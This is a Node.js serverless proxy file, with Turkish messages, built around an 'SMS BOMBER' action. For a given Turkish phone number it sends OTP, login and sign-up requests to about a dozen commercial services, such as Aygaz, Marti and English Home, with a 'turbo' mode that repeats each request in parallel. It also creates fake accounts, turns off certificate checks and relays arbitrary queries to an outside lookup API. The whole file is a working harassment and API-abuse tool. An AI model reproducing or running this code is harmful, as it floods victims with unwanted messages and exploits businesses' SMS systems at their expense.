// api/proxy.js
const https = require('https');

const agent = new https.Agent({ rejectUnauthorized: false, keepAlive: true });

const rnd = (n = 8) => Array.from({ length: n }, () => 'abcdefghijklmnopqrstuvwxyz0123456789'[Math.floor(Math.random() * 36)]).join('');
const rnum = (n = 4) => Math.floor(Math.random() * Math.pow(10, n));
const phone0 = (p) => `0${p}`;
const phone90 = (p) => `90${p}`;

// ─── HTTP yardımcıları (https modülü ile) ───
function httpRequest(url, options = {}, body = null) {
    return new Promise((resolve, reject) => {
        const u = new URL(url);
        const req = https.request({
            hostname: u.hostname,
            port: u.port || 443,
            path: u.pathname + u.search,
            method: options.method || 'GET',
            headers: options.headers || {},
            agent,
            timeout: 12000,
        }, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                let parsed = null;
                try { parsed = JSON.parse(data); } catch (e) { parsed = data; }
                resolve({ status: res.statusCode, data: parsed, raw: data });
            });
        });
        req.on('timeout', () => { req.destroy(new Error('timeout')); });
        req.on('error', reject);
        if (body) req.write(body);
        req.end();
    });
}

async function postJson(url, body, headers = {}) {
    return httpRequest(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0', ...headers }
    }, JSON.stringify(body));
}

async function getJson(url, headers = {}) {
    return httpRequest(url, { method: 'GET', headers: { 'User-Agent': 'Mozilla/5.0', ...headers } });
}

// ─── Servisler ───
const services = {
    bim: async (p) => {
        await postJson('https://bim.veesk.net/service/v1.0/account/login', { phone: phone90(p) });
        return true;
    },
    file: async (p) => {
        const r = await postJson('https://api.filemarket.com.tr/v1/otp/send', { mobilePhoneNumber: phone90(p) });
        return r.data?.data === '200 OK' || r.status === 200;
    },
    aygaz: async (p) => {
        const r = await postJson('https://ecommerce-memberapi.aygaz.com.tr/api/Membership/SendVerificationCode', { Gsm: p });
        return r.status === 200;
    },
    qumpara: async (p) => {
        const r = await postJson('https://tr-api.fisicek.com/v1.4/auth/getOTP', { msisdn: p });
        return r.status === 200;
    },
    mopas: async (p) => {
        const tr = await postJson(
            'https://api.mopas.com.tr//authorizationserver/oauth/token?client_id=mobile_mopas&client_secret=secret_mopas&grant_type=client_credentials',
            null
        );
        if (!tr.data?.access_token) return false;
        const r = await getJson(
            `https://api.mopas.com.tr//mopaswebservices/v2/mopas/sms/sendSmsVerification?mobileNumber=${p}`,
            { authorization: `${tr.data.token_type} ${tr.data.access_token}` }
        );
        return r.status === 200;
    },
    saka: async (p) => {
        const r = await postJson('https://mobilcrm2.saka.com.tr/api/customer/login', { gsm: phone0(p) });
        return r.data?.status === 1 || r.status === 200;
    },
    gofody: async (p) => {
        const r = await postJson('https://backend.gofody.com/api/v1/enduser/register/', { country_code: '90', phone: p });
        return r.data?.success === true || r.status === 200;
    },
    scooby: async (p) => {
        const r = await getJson(`https://sct.scoobyturkiye.com/v1/mobile/user/code-request?phoneNumber=90${p}`);
        return r.status === 200;
    },
    pinar: async (p) => {
        const r = await postJson(
            'https://pinarsumobileservice.yasar.com.tr/pinarsu-mobil/api/Customer/SendOtp',
            { MobilePhone: p },
            { devicetype: 'android' }
        );
        return String(r.data).toLowerCase() === 'true' || r.status === 200;
    },
    marti: async (p) => {
        const r = await postJson(
            'https://customer.martiscooter.com/v13/scooter/dispatch/customer/signin',
            { mobilePhone: p, mobilePhoneCountryCode: '90' }
        );
        return r.data?.isSuccess === true || r.status === 200;
    },
    karma: async (p) => {
        const r = await postJson('https://api.gokarma.app/v1/auth/send-sms', {
            phoneNumber: phone90(p), type: 'REGISTER', deviceId: rnd(16), language: 'tr-TR'
        });
        return r.status === 200 || r.status === 201;
    },
    englishhome: async (p) => {
        const r = await postJson('https://www.englishhome.com:443/enh_app/users/registration/', {
            first_name: 'Test', last_name: 'Test', email: `t${rnum()}@gmail.com`,
            phone: phone0(p), password: 'Password123!', email_allowed: false, sms_allowed: false, confirm: true, tom_pay_allowed: true
        });
        return r.status === 200 || r.status === 201;
    }
};

// ─── Tek servis çağrısı (retry'li) ───
async function tryService(name, phone, retries = 1) {
    for (let attempt = 0; attempt <= retries; attempt++) {
        try {
            const ok = await services[name](phone);
            if (ok) return { service: name, success: true, message: 'Gönderildi' };
        } catch (e) {
            if (attempt === retries) return { service: name, success: false, message: e.message };
        }
    }
    return { service: name, success: false, message: 'Yanıt başarısız' };
}

// ─── Turbo: aynı servisten N kez paralel ───
async function turboService(name, phone, count = 4) {
    const promises = Array.from({ length: count }, () => tryService(name, phone, 0));
    const results = await Promise.all(promises);
    const successCount = results.filter(r => r.success).length;
    return {
        service: name,
        success: successCount > 0,
        message: `${successCount}/${count} başarılı`,
        count: successCount,
        total: count
    };
}

module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    if (req.method === 'OPTIONS') return res.status(200).end();

    try {
        const query = req.query || {};
        const { action, phone, endpoint, turbo, ...params } = query;

        // ─── SMS BOMBER ───
        if (action === 'smsbomber') {
            if (!phone) return res.status(400).json({ error: 'Telefon numarası gerekli.' });
            if (!/^\d{10}$/.test(phone)) return res.status(400).json({ error: 'Telefon numarası 10 haneli olmalı (örn: 5551234567).' });

            const isTurbo = turbo === '1' || turbo === 'true';
            const results = [];

            if (isTurbo) {
                // Turbo: her servisten 4 kez paralel
                const promises = Object.keys(services).map(name => turboService(name, phone, 4));
                const allResults = await Promise.all(promises);
                results.push(...allResults);
            } else {
                // Normal: her servisten 1 kez, retry'li
                for (const name of Object.keys(services)) {
                    const r = await tryService(name, phone, 1);
                    results.push(r);
                }
            }

            const basarili = results.filter(r => r.success).length;
            const toplamIstek = isTurbo ? Object.keys(services).length * 4 : Object.keys(services).length;
            const toplamBasarili = isTurbo
                ? results.reduce((sum, r) => sum + (r.count || 0), 0)
                : basarili;

            return res.status(200).json({
                total: toplamIstek,
                basarili: toplamBasarili,
                basarisiz: toplamIstek - toplamBasarili,
                turbo: isTurbo,
                results
            });
        }

        // ─── STANDART SORGU ───
        if (!endpoint) return res.status(400).json({ error: 'Endpoint belirtilmedi.' });

        try {
            const url = new URL(`https://api.ajaxsystems.fun/${endpoint}`);
            Object.entries(params).forEach(([k, v]) => url.searchParams.set(k, v));
            const r = await getJson(url.toString());
            return res.status(200).json(r.data);
        } catch (error) {
            return res.status(200).json({ error: error.message || 'API isteği başarısız oldu.' });
        }

    } catch (globalError) {
        console.error('[PROXY GLOBAL HATA]', globalError);
        return res.status(500).json({ error: 'Sunucu hatası: ' + (globalError.message || 'Bilinmeyen hata') });
    }
};
